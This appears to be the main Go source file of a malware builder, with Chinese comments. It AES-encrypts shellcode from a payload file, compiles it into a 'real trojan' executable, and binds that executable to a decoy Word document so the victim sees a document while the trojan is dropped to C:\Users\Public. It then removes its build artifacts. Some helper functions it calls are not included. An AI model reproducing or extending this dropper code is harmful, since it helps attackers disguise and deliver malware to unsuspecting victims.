package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"os"

	"github.com/fatih/color"
)

func main() {
	start()
	var input string
	var word string
	var outword string
	var exeout string
	var output string
	path := os.Args[0]
	flag.StringVar(&input, "i", "payload.bin", "payload.bin文件")
	flag.StringVar(&word, "w", "新建 DOCX 文档.docx", "捆绑的word.docx")
	flag.StringVar(&outword, "wn", "test.docx", "打开的word文件名")
	flag.StringVar(&exeout, "eo", `C:\Users\Public\exe.exe`, "真实马输出的路径和文件名")
	flag.StringVar(&output, "o", "out.exe", "最后输出的exe文件名")
	flag.Parse()
	//读取payload.bin内容
	buf := sc2aes(input)
	//aes加密,返回base64内容和key
	s, k := ctoAes(buf)
	//编译真实马
	toexe(s, path)
	//文件转base64
	fmt.Println(string(k))
	wordfile := tobase(word)
	exefile := tobase("exe.exe")
	binding(wordfile, outword, exefile, exeout, string(k), output, path)
	deltmp()

}

func sc2aes(input string) []byte {
	readercfile, err := os.ReadFile(input)
	if err != nil {
		fmt.Println("读取shellcode文件内容失败")
	}
	//	fmt.Println(readercfile)

	//fmt.Println(shellcode)
	return readercfile
}

func tobase(file string) string {
	readword, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println("打开" + file + "文件失败")
		os.Exit(0)
	}
	str := base64.StdEncoding.EncodeToString(readword)
	return str
}

func deltmp() {
	os.Remove("build.bat")
	os.Remove("exe.exe")
	os.Remove("ok.go")
	os.Remove("exe.go")
}

func start() {
	fmt.Println("===================================================================================")
	color.Cyan("              _                                     _                     _       ")
	color.Red("             | |                             _     ( )     _             | |      ")
	color.Yellow("  ____   ____| |__   ___  ____  _____  ___ _| |_   |/    _| |_ ___   ___ | |  ___ ")
	color.Blue(" |    \\ / ___)  _ \\ / _ \\|  _ \\| ___ |/___|_   _)       (_   _) _ \\ / _ \\| | /___)")
	color.Magenta(" | | | | |   | | | | |_| | | | | ____|___ | | |_          | || |_| | |_| | ||___ |")
	color.Green(" |_|_|_|_|   |_| |_|\\___/|_| |_|_____|___/   \\__)          \\__)___/ \\___/ \\_|___/ ")
	fmt.Println("===================================================================================")
}
